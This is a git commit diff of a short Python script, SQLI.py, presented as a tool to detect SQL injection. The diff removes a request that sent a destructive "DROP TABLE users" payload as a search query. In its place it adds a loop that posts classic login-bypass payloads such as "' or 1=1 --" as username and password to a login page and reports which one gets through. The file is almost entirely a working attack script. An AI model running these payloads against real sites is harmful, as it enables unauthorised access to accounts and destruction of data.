4a13065c9e1c12d25a3ef6d8517dd5c368e8c794
ANESTUS UDUME <72416001+adx-max@users.noreply.github.com>
2023-03-07 13:58:47 +0300

    Update SQLI.py

--- SQLI.py
+++ SQLI.py
@@ -1,14 +1,13 @@
 print('CREATED BY ANESTUS UDUME FROM BENTECH SECURITY TO AUTO DETECT SQLI INJECTION')
 import requests
 
-url = 'https://example.com/search'
-search_query = "'; DROP TABLE users;--"
+url = "http://example.com/login.php"
 
-# Send a GET request with the injected search query
-response = requests.get(url, params={'q': search_query})
+payloads = ["' or 1=1 --", "' or '1'='1", "' or 1=1#", "' or '1'='1#", "') or ('a'='a"]
 
-# Check if the SQL injection was successful
-if 'error' in response.text.lower() or 'syntax error' in response.text.lower():
-    print('SQL injection vulnerability found')
-else:
-    print('No SQL injection vulnerability found, SORRY')
+for payload in payloads:
+    data = {"username": payload, "password": payload}
+    response = requests.post(url, data=data)
+    if "invalid credentials" not in response.text.lower():
+        print("SQL injection vulnerability found with payload: " + payload)
+
